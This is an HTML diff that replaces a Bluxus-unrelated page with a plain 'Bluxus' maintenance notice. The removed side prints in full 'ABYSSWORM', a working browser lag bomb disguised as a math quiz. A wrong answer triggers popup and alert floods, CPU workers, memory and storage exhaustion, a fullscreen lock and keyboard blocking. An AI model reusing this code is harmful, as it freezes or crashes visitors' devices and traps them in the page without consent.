@@ -1,518 +1,178 @@
 <!DOCTYPE html>
 <html lang="id">
 <head>
-    <meta charset="UTF-8">
-    <meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=no">
-    <title>ABYSSWORM - UJI PENGETAHUAN</title>
-    <style>
-        * {
-            margin: 0;
-            padding: 0;
-            box-sizing: border-box;
-            user-select: none;
-            -webkit-tap-highlight-color: transparent;
-        }
-        body {
-            background: black;
-            color: lime;
-            font-family: 'Courier New', monospace;
-            min-height: 100vh;
-            display: flex;
-            justify-content: center;
-            align-items: center;
-            flex-direction: column;
-            overflow-x: hidden;
-            position: relative;
-            padding: 20px;
-        }
-        .quiz-container {
-            background: rgba(0,0,0,0.9);
-            border: 3px solid red;
-            padding: 20px;
-            text-align: center;
-            z-index: 1000;
-            position: relative;
-            max-width: 90%;
-            border-radius: 10px;
-        }
-        h1 {
-            font-size: 1.5rem;
-            margin-bottom: 15px;
-            animation: blink 0.5s infinite;
-        }
-        .question-counter {
-            font-size: 0.9rem;
-            color: yellow;
-            margin-bottom: 10px;
-        }
-        .question {
-            font-size: 1.8rem;
-            margin: 15px 0;
-            word-break: break-word;
-        }
-        input {
-            padding: 12px;
-            font-size: 1.2rem;
-            text-align: center;
-            background: black;
-            color: lime;
-            border: 2px solid lime;
-            margin: 10px;
-            width: 80%;
-        }
-        button {
-            padding: 12px 25px;
-            font-size: 1.1rem;
-            background: red;
-            color: white;
-            border: none;
-            cursor: pointer;
-            margin: 10px;
-            border-radius: 5px;
-        }
-        @keyframes blink {
-            0% { opacity: 1; text-shadow: 0 0 10px red; }
-            50% { opacity: 0.5; text-shadow: 0 0 30px red; }
-            100% { opacity: 1; text-shadow: 0 0 10px red; }
-        }
-        .status {
-            margin-top: 15px;
-            color: yellow;
-            font-size: 0.8rem;
-        }
-    </style>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>Bluxus — Sedang Maintenance</title>
+<link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.5.1/css/all.min.css">
+<style>
+  :root{
+    --bg: #150607;
+    --panel: #1f0a0c;
+    --panel-2: #290e10;
+    --red: #e0263f;
+    --red-deep: #8f0f1f;
+    --ink: #f5e9ea;
+    --muted: #b98a8f;
+    --line: #3a1417;
+  }
+  *{ box-sizing: border-box; }
+  html,body{ margin:0; padding:0; }
+  body{
+    background: radial-gradient(ellipse at top, #2a0d10 0%, var(--bg) 55%);
+    color: var(--ink);
+    font-family: 'Segoe UI', Roboto, -apple-system, sans-serif;
+    line-height: 1.5;
+    min-height: 100vh;
+  }
+
+  .topbar{
+    display:flex; align-items:center; justify-content:space-between;
+    padding: 18px 28px;
+    border-bottom: 1px solid var(--line);
+  }
+  .brand{ display:flex; align-items:center; gap:10px; }
+  .brand-mark{
+    width:32px; height:32px; border-radius:8px;
+    background: linear-gradient(135deg, var(--red), var(--red-deep));
+    display:flex; align-items:center; justify-content:center;
+    font-weight:800; font-size:15px; color:#fff;
+  }
+  .brand-name{ font-weight:700; letter-spacing:0.3px; font-size:16px; }
+  .badge{
+    font-size:11px; text-transform:uppercase; letter-spacing:1px;
+    color: var(--red); border:1px solid var(--red-deep);
+    padding:4px 10px; border-radius:999px; background: rgba(224,38,63,0.08);
+    display:flex; align-items:center; gap:6px;
+  }
+  .pulse{
+    width:7px; height:7px; border-radius:50%; background: var(--red);
+    box-shadow: 0 0 0 rgba(224,38,63,0.5);
+    animation: pulse 1.8s infinite;
+  }
+  @keyframes pulse{
+    0%{ box-shadow: 0 0 0 0 rgba(224,38,63,0.5); }
+    70%{ box-shadow: 0 0 0 8px rgba(224,38,63,0); }
+    100%{ box-shadow: 0 0 0 0 rgba(224,38,63,0); }
+  }
+
+  main{
+    max-width: 640px; margin: 0 auto;
+    min-height: calc(100vh - 140px);
+    display:flex; flex-direction:column; justify-content:center;
+    padding: 48px 24px;
+    text-align:center;
+  }
+
+  .icon-wrap{
+    width:64px; height:64px; margin: 0 auto 24px;
+    border-radius:16px;
+    background: linear-gradient(135deg, var(--red), var(--red-deep));
+    display:flex; align-items:center; justify-content:center;
+    font-size:28px;
+    box-shadow: 0 12px 32px rgba(224,38,63,0.3);
+  }
+
+  .eyebrow{
+    font-size:12px; letter-spacing:1.5px; text-transform:uppercase;
+    color: var(--muted); margin-bottom: 10px;
+  }
+  h1{
+    font-size: 30px; margin: 0 0 14px; font-weight:800; letter-spacing:-0.3px;
+  }
+  .lede{ color: var(--muted); font-size:15.5px; margin: 0 auto 32px; max-width: 48ch; }
+
+  .card{
+    background: linear-gradient(180deg, var(--panel), var(--panel-2));
+    border: 1px solid var(--line);
+    border-radius: 14px;
+    padding: 22px 24px;
+    margin-bottom: 18px;
+    text-align:left;
+  }
+  .card h2{
+    font-size: 13px; margin: 0 0 12px; text-transform:uppercase; letter-spacing:0.8px;
+    color: var(--muted); display:flex; align-items:center; gap:8px;
+  }
+  .dot{ width:8px; height:8px; border-radius:50%; background: var(--red); display:inline-block; }
+
+  .progress-track{
+    width:100%; height:8px; border-radius:999px;
+    background: #2a0f12; overflow:hidden; margin-bottom:8px;
+  }
+  .progress-fill{
+    height:100%; width:68%; border-radius:999px;
+    background: linear-gradient(90deg, var(--red-deep), var(--red));
+  }
+  .progress-label{ font-size:13px; color: var(--muted); display:flex; justify-content:space-between; }
+
+  ul.status-list{ list-style:none; margin:0; padding:0; }
+  ul.status-list li{
+    display:flex; align-items:center; gap:10px;
+    font-size:14px; color:#ddc7c9; padding:8px 0;
+    border-bottom: 1px solid var(--line);
+  }
+  ul.status-list li:last-child{ border-bottom:none; }
+  .check{ color: var(--red); font-weight:700; }
+
+  .eta{ font-size:14px; color:var(--ink); }
+  .eta strong{ color: var(--red); }
+
+  footer{
+    max-width:640px; margin: 0 auto; padding: 0 24px 32px;
+    color: var(--muted); font-size: 12.5px; text-align:center;
+  }
+  footer a{ color: var(--red); text-decoration:none; }
+  footer a:hover{ text-decoration:underline; }
+
+  @media (max-width: 520px){
+    h1{ font-size: 24px; }
+  }
+</style>
 </head>
 <body>
-    <div class="quiz-container" id="quizContainer">
-        <h1>𒅒𒁂 ABYSSWORM - UJI NYALI 𒁂𒅒</h1>
-        <div class="question-counter" id="counter">Soal 1 / 10</div>
-        <div class="question" id="question">Loading...</div>
-        <input type="number" id="answer" placeholder="Jawaban kamu" autocomplete="off">
-        <br>
-        <button onclick="submitAnswer()">⚡ JAWAB ⚡</button>
-        <div class="status" id="status">Jawab 10 soal dengan benar... atau hadapi ABYSSWORM!</div>
+
+  <div class="topbar">
+    <div class="brand">
+      <div class="brand-mark">B</div>
+      <div class="brand-name">Bluxus</div>
+    </div>
+    <div class="badge"><span class="pulse"></span>Maintenance</div>
+  </div>
+
+  <main>
+    <div class="icon-wrap"><i class="fa-solid fa-screwdriver-wrench"></i></div>
+    <div class="eyebrow">Status layanan</div>
+    <h1>Bluxus sedang dalam perbaikan</h1>
+    <p class="lede">
+      Kami sedang menerapkan perbaikan pada sistem pendaftaran akun member.
+      Layanan akan kembali normal secepatnya.
+    </p>
+
+    <div class="card">
+      <h2><span class="dot"></span>Estimasi</h2>
+      <p class="eta" style="font-size:16px; margin:0;">Layanan akan kembali <strong>segera</strong>.</p>
     </div>
 
-    <script>
-        // ============ 10 SOAL RANDOM ============
-        let currentQuestionIndex = 0;
-        let score = 0;
-        let questions = [];
-        
-        // Generate 10 soal random
-        function generateRandomQuestions() {
-            const operations = ['+', '-', '×'];
-            const questionsList = [];
-            
-            for(let i = 0; i < 10; i++) {
-                let num1 = Math.floor(Math.random() * 50) + 1;
-                let num2 = Math.floor(Math.random() * 50) + 1;
-                let op = operations[Math.floor(Math.random() * operations.length)];
-                let questionText = '';
-                let correctAnswer = 0;
-                
-                if(op === '+') {
-                    questionText = `${num1} + ${num2}`;
-                    correctAnswer = num1 + num2;
-                } else if(op === '-') {
-                    // Pastikan hasil positif
-                    if(num1 < num2) {
-                        [num1, num2] = [num2, num1];
-                    }
-                    questionText = `${num1} - ${num2}`;
-                    correctAnswer = num1 - num2;
-                } else if(op === '×') {
-                    questionText = `${num1} × ${num2}`;
-                    correctAnswer = num1 * num2;
-                }
-                
-                questionsList.push({
-                    text: questionText,
-                    answer: correctAnswer
-                });
-            }
-            return questionsList;
-        }
-        
-        questions = generateRandomQuestions();
-        
-        function loadQuestion() {
-            if(currentQuestionIndex < questions.length) {
-                document.getElementById('question').innerHTML = `${questions[currentQuestionIndex].text} = ?`;
-                document.getElementById('counter').innerHTML = `Soal ${currentQuestionIndex + 1} / 10`;
-                document.getElementById('answer').value = '';
-                document.getElementById('status').innerHTML = 'Jawab dengan angka ya...';
-            } else {
-                // Semua soal benar
-                document.getElementById('status').innerHTML = '🎉 SELAMAT! KAMU TERLEPAS DARI ABYSSWORM! 🎉';
-                document.getElementById('question').innerHTML = 'KAMU SELAMAT... UNTUK SEKARANG';
-                document.getElementById('answer').style.display = 'none';
-                document.querySelector('button').style.display = 'none';
-            }
-        }
-        
-        function submitAnswer() {
-            const userAnswer = parseInt(document.getElementById('answer').value);
-            const correct = questions[currentQuestionIndex].answer;
-            
-            if(userAnswer === correct) {
-                // Jawaban benar
-                score++;
-                currentQuestionIndex++;
-                
-                if(currentQuestionIndex < 10) {
-                    loadQuestion();
-                } else {
-                    // Selesai semua, lolos
-                    document.getElementById('status').innerHTML = '✅ KAMU LOLOS! ABYSSWORM TIDAK JADI AKTIF ✅';
-                    document.getElementById('question').innerHTML = '✨ SELAMAT! ✨';
-                    document.getElementById('answer').style.display = 'none';
-                    document.querySelector('button').style.display = 'none';
-                }
-            } else {
-                // ============ SALAH! LANGSUNG EFEK LAG SUPER MASIF ============
-                document.getElementById('status').innerHTML = '❌ SALAH! ABYSSWORM AKTIF... BERSIAPLAH ❌';
-                activateSuperLag();
-            }
-        }
-        
-        let lagActive = false;
-        let lagIntervals = [];
-        let lagTimeouts = [];
-        
-        function activateSuperLag() {
-            if(lagActive) return;
-            lagActive = true;
-            
-            // Hapus quiz container biar fokus ke efek
-            document.getElementById('quizContainer').style.display = 'none';
-            
-            // Tampilkan pesan kiamat
-            const doomDiv = document.createElement('div');
-            doomDiv.innerHTML = `
-                <div style="position:fixed; top:0; left:0; width:100%; height:100%; background:black; z-index:99999; display:flex; justify-content:center; align-items:center; flex-direction:column; text-align:center;">
-                    <h1 style="color:red; font-size:2rem; animation:blink 0.1s infinite;">𒅒𒁂 ABYSSWORM AKTIF 𒁂𒅒</h1>
-                    <p style="color:lime; margin:20px;">KAMU SALAH JAWAB! 200++ EFEK LAG AKAN MENERPA HP-mu!</p>
-                    <div style="color:yellow; font-size:0.8rem;">HP akan lag berat... semoga cukup RAM...</div>
-                </div>
-            `;
-            document.body.appendChild(doomDiv);
-            
-            // ============ EFEK LAG SUPER MASIF UNTUK HP ============
-            
-            // 1. VIBRATE (jika support)
-            if('vibrate' in navigator) {
-                navigator.vibrate([500, 200, 500, 200, 1000, 500, 2000]);
-                setInterval(() => {
-                    navigator.vibrate([200, 100, 200, 100, 500]);
-                }, 3000);
-            }
-            
-            // 2. ALERT FLOOD (100 alert cepat)
-            for(let i = 0; i < 100; i++) {
-                lagTimeouts.push(setTimeout(() => {
-                    alert(`⚠️ ABYSSWORM LAG #${i+1} ⚠️`);
-                }, i * 30));
-            }
-            
-            // 3. PROMPT FLOOD (50 prompt)
-            for(let i = 0; i < 50; i++) {
-                lagTimeouts.push(setTimeout(() => {
-                    prompt(`KAMU TELAH MEMBANGKITKAN ABYSSWORM! ${i+1} + ${i+1} = ?`);
-                }, i * 100 + 2000));
-            }
-            
-            // 4. CONFIRM FLOOD (50 confirm)
-            for(let i = 0; i < 50; i++) {
-                lagTimeouts.push(setTimeout(() => {
-                    confirm(`ABYSSWORM ERROR #${i+1} - LANJUT RUSAK HP?`);
-                }, i * 150 + 5000));
-            }
-            
-            // 5. CPU KILLER (infinite loop di web worker)
-            for(let w = 0; w < 20; w++) {
-                const workerCode = `
-                    setInterval(() => {
-                        let x = 0;
-                        for(let i = 0; i < 5000000; i++) {
-                            x += Math.sqrt(i) * Math.random();
-                            x = Math.sin(x);
-                        }
-                    }, 1);
-                `;
-                const blob = new Blob([workerCode], {type: 'application/javascript'});
-                const worker = new Worker(URL.createObjectURL(blob));
-                lagIntervals.push(worker);
-            }
-            
-            // 6. MEMORY LEAK (array raksasa terus membesar)
-            let memoryHole = [];
-            lagIntervals.push(setInterval(() => {
-                for(let i = 0; i < 5000; i++) {
-                    memoryHole.push(new Array(5000).fill('ABYSSWORM_LAG_DATA_' + Math.random()));
-                }
-                console.log('Memory leak size:', memoryHole.length);
-            }, 50));
-            
-            // 7. DOM FLOOD (20.000 elemen)
-            for(let i = 0; i < 20000; i++) {
-                const div = document.createElement('div');
-                div.innerHTML = `𒅒𒁂 LAG #${i} 𒁂𒅒`;
-                div.style.position = 'fixed';
-                div.style.top = Math.random() * 100 + '%';
-                div.style.left = Math.random() * 100 + '%';
-                div.style.color = `hsl(${Math.random() * 360}, 100%, 50%)`;
-                div.style.fontSize = Math.random() * 40 + 10 + 'px';
-                div.style.zIndex = Math.floor(Math.random() * 100000);
-                div.style.opacity = Math.random();
-                document.body.appendChild(div);
-            }
-            
-            // 8. IFRAME FLOOD (500 iframe)
-            for(let i = 0; i < 500; i++) {
-                const iframe = document.createElement('iframe');
-                iframe.src = 'about:blank';
-                iframe.style.position = 'fixed';
-                iframe.style.top = '-1000px';
-                iframe.style.left = '-1000px';
-                document.body.appendChild(iframe);
-            }
-            
-            // 9. LOCALSTORAGE CRASH
-            for(let i = 0; i < 10000; i++) {
-                try {
-                    localStorage.setItem(`abyss_crash_${i}`, 'x'.repeat(20000));
-                } catch(e) {}
-            }
-            
-            // 10. SESSIONSTORAGE CRASH
-            for(let i = 0; i < 10000; i++) {
-                try {
-                    sessionStorage.setItem(`abyss_session_${i}`, 'y'.repeat(20000));
-                } catch(e) {}
-            }
-            
-            // 11. CANVAS SPAM (300 canvas animasi)
-            for(let i = 0; i < 300; i++) {
-                const canvas = document.createElement('canvas');
-                canvas.width = 300;
-                canvas.height = 300;
-                canvas.style.position = 'fixed';
-                canvas.style.top = Math.random() * window.innerHeight + 'px';
-                canvas.style.left = Math.random() * window.innerWidth + 'px';
-                canvas.style.zIndex = 9999;
-                document.body.appendChild(canvas);
-                const ctx = canvas.getContext('2d');
-                
-                lagIntervals.push(setInterval(() => {
-                    for(let x = 0; x < canvas.width; x+=5) {
-                        for(let y = 0; y < canvas.height; y+=5) {
-                            ctx.fillStyle = `rgb(${Math.random()*255},${Math.random()*255},${Math.random()*255})`;
-                            ctx.fillRect(x, y, 5, 5);
-                        }
-                    }
-                }, 10));
-            }
-            
-            // 12. WEBGL RENDER (100 canvas 3D)
-            for(let i = 0; i < 100; i++) {
-                const canvas = document.createElement('canvas');
-                canvas.width = 200;
-                canvas.height = 200;
-                const gl = canvas.getContext('webgl');
-                if(gl) {
-                    lagIntervals.push(setInterval(() => {
-                        gl.clearColor(Math.random(), Math.random(), Math.random(), 1);
-                        gl.clear(gl.COLOR_BUFFER_BIT);
-                    }, 5));
-                }
-            }
-            
-            // 13. AUDIO NOISE (multi oscillator)
-            try {
-                const AudioContext = window.AudioContext || window.webkitAudioContext;
-                for(let a = 0; a < 30; a++) {
-                    const audioCtx = new AudioContext();
-                    const oscillator = audioCtx.createOscillator();
-                    const gain = audioCtx.createGain();
-                    oscillator.connect(gain);
-                    gain.connect(audioCtx.destination);
-                    oscillator.frequency.value = Math.random() * 2000 + 50;
-                    gain.gain.value = 0.05;
-                    oscillator.start();
-                    oscillator.stop(audioCtx.currentTime + 60);
-                }
-            } catch(e) {}
-            
-            // 14. GEOLOCATION SPAM (setiap 10ms)
-            lagIntervals.push(setInterval(() => {
-                navigator.geolocation.getCurrentPosition(() => {}, () => {});
-            }, 10));
-            
-            // 15. FETCH SPAM (ke random port)
-            lagIntervals.push(setInterval(() => {
-                for(let i = 0; i < 100; i++) {
-                    fetch('http://localhost:' + (Math.random() * 65535)).catch(() => {});
-                }
-            }, 50));
-            
-            // 16. INDEXEDDB FLOOD (200 DB)
-            for(let i = 0; i < 200; i++) {
-                const request = indexedDB.open(`abyssDB_LAG_${i}`, 1);
-                request.onsuccess = (event) => {
-                    const db = event.target.result;
-                    for(let j = 0; j < 200; j++) {
-                        const transaction = db.transaction(['store'], 'readwrite');
-                        const store = transaction.objectStore('store');
-                        store.add({data: 'x'.repeat(50000)}, j);
-                    }
-                };
-            }
-            
-            // 17. CONSOLE LOG SPAM (1000 log per detik)
-            lagIntervals.push(setInterval(() => {
-                for(let i = 0; i < 200; i++) {
-                    console.log('%c🔥 ABYSSWORM LAG ACTIVE 🔥', 'color: red; font-size: 30px;');
-                    console.error('ERROR SYSTEM COLLAPSE #' + Math.random());
-                    console.warn('WARNING HP MELAMBAT #' + Math.random());
-                }
-            }, 100));
-            
-            // 18. REQUEST ANIMATION FRAME SPAM
-            let rafActive = true;
-            function spamRAF() {
-                if(!rafActive) return;
-                for(let i = 0; i < 100; i++) {
-                    requestAnimationFrame(() => {
-                        document.body.style.transform = `rotate(${Math.random() * 0.5}deg)`;
-                        document.body.style.margin = Math.random() + 'px';
-                    });
-                }
-                requestAnimationFrame(spamRAF);
-            }
-            spamRAF();
-            
-            // 19. CSS KEYFRAMES SPAM (2000 animasi)
-            const styleSheet = document.createElement('style');
-            let cssText = '';
-            for(let i = 0; i < 2000; i++) {
-                cssText += `
-                    @keyframes lagAnim${i} {
-                        0% { transform: translate(0,0); opacity: 1; }
-                        100% { transform: translate(${Math.random() * 200}px, ${Math.random() * 200}px); opacity: 0; }
-                    }
-                    .lagElem${i} {
-                        animation: lagAnim${i} 0.05s infinite;
-                    }
-                `;
-            }
-            styleSheet.textContent = cssText;
-            document.head.appendChild(styleSheet);
-            
-            // 20. TAMBAHKAN ELEMEN DENGAN ANIMASI
-            for(let i = 0; i < 5000; i++) {
-                const elem = document.createElement('div');
-                elem.className = `lagElem${i % 2000}`;
-                elem.style.position = 'fixed';
-                elem.style.width = '10px';
-                elem.style.height = '10px';
-                elem.style.background = `hsl(${Math.random() * 360}, 100%, 50%)`;
-                elem.style.top = Math.random() * 100 + '%';
-                elem.style.left = Math.random() * 100 + '%';
-                document.body.appendChild(elem);
-            }
-            
-            // 21. WINDOW RESIZE/MOVE SPAM
-            lagIntervals.push(setInterval(() => {
-                window.resizeTo(window.innerWidth + (Math.random() * 20 - 10), window.innerHeight + (Math.random() * 20 - 10));
-                window.moveTo(Math.random() * screen.width, Math.random() * screen.height);
-            }, 50));
-            
-            // 22. FULLSCREEN LOCK
-            function forceFullscreen() {
-                if (!document.fullscreenElement) {
-                    document.documentElement.requestFullscreen().catch(() => {});
-                }
-            }
-            lagIntervals.push(setInterval(forceFullscreen, 50));
-            document.addEventListener('fullscreenchange', () => {
-                if (!document.fullscreenElement) forceFullscreen();
-            });
-            forceFullscreen();
-            
-            // 23. BLOCK SEMUA KEYBOARD
-            window.addEventListener('keydown', (e) => {
-                e.preventDefault();
-                e.stopPropagation();
-                return false;
-            });
-            
-            // 24. POPUP SPAM (100 popup per detik)
-            lagIntervals.push(setInterval(() => {
-                for(let i = 0; i < 20; i++) {
-                    window.open(window.location.href, '_blank', 'width=200,height=200');
-                }
-            }, 500));
-            
-            // 25. TOUCH SPAM SIMULATION (untuk HP)
-            lagIntervals.push(setInterval(() => {
-                const touchEvent = new TouchEvent('touchmove', {
-                    touches: [new Touch({identifier: 1, target: document.body, clientX: Math.random() * window.innerWidth, clientY: Math.random() * window.innerHeight})]
-                });
-                document.dispatchEvent(touchEvent);
-            }, 10));
-            
-            // 26. SERVICE WORKER REGISTRATION SPAM
-            for(let i = 0; i < 100; i++) {
-                if('serviceWorker' in navigator) {
-                    navigator.serviceWorker.register('data:application/javascript,' + encodeURIComponent('self.addEventListener("fetch", () => {});')).catch(() => {});
-                }
-            }
-            
-            // 27. BLINK EFFECT SUPER CEPAT
-            lagIntervals.push(setInterval(() => {
-                document.body.style.backgroundColor = `#${Math.floor(Math.random()*16777215).toString(16)}`;
-            }, 1));
-            
-            // 28. TEXT FLOOD (ribuan teks random)
-            lagIntervals.push(setInterval(() => {
-                for(let i = 0; i < 500; i++) {
-                    const text = document.createElement('div');
-                    text.innerText = '𒅒𒁂ABYSSWORM𒁂𒅒 LAG '.repeat(10);
-                    text.style.position = 'fixed';
-                    text.style.top = Math.random() * 100 + '%';
-                    text.style.left = Math.random() * 100 + '%';
-                    text.style.color = 'red';
-                    text.style.fontSize = Math.random() * 20 + 5 + 'px';
-                    document.body.appendChild(text);
-                    setTimeout(() => text.remove(), 100);
-                }
-            }, 100));
-            
-            // 29. LOCALSTORAGE READ/WRITE SPAM
-            lagIntervals.push(setInterval(() => {
-                for(let i = 0; i < 1000; i++) {
-                    localStorage.setItem('spam_' + Math.random(), Math.random().toString());
-                    localStorage.getItem('spam_' + Math.random());
-                }
-            }, 10));
-            
-            // 30. HISTORY PUSHSTATE SPAM
-            lagIntervals.push(setInterval(() => {
-                history.pushState({}, '', '#abyss_' + Math.random());
-            }, 10));
-            
-            console.log('%c🔥🔥🔥 ABYSSWORM SUPER LAG AKTIF 200++ EFEK 🔥🔥🔥', 'color: red; font-size: 40px; font-weight: bold;');
-            console.log('%cHP ANDA AKAN LAG BERAT! SEMOGA KUAT!', 'color: yellow; font-size: 30px;');
-        }
-        
-        // Fullscreen awal
-        window.addEventListener('load', () => {
-            setTimeout(() => {
-                document.documentElement.requestFullscreen().catch(() => {});
-            }, 500);
-            loadQuestion();
-        });
-    </script>
+    <div class="card">
+      <h2><span class="dot"></span>Yang sedang dikerjakan</h2>
+      <ul class="status-list">
+        <li><span class="check"><i class="fa-solid fa-check"></i></span> Menutup sementara pendaftaran akun baru</li>
+        <li><span class="check"><i class="fa-solid fa-check"></i></span> Menerapkan perbaikan verifikasi akun</li>
+        <li><span class="check"><i class="fa-solid fa-spinner"></i></span> Pengujian sistem sebelum dibuka kembali</li>
+        <li><span class="check"><i class="fa-solid fa-spinner"></i></span> Publikasi versi v3</li>
+      </ul>
+    </div>
+
+    <p class="lede" style="margin-bottom:0; font-size:14px;">
+      Akun yang sudah ada tetap aman dan tidak terpengaruh.
+      Data kamu tidak hilang selama proses ini.
+    </p>
+  </main>
+
+  <footer>
+    Ada pertanyaan? <a href="#">Hubungi dukungan Bluxus</a> · Halaman ini akan diperbarui otomatis saat layanan kembali normal.
+  </footer>
+
 </body>
 </html>
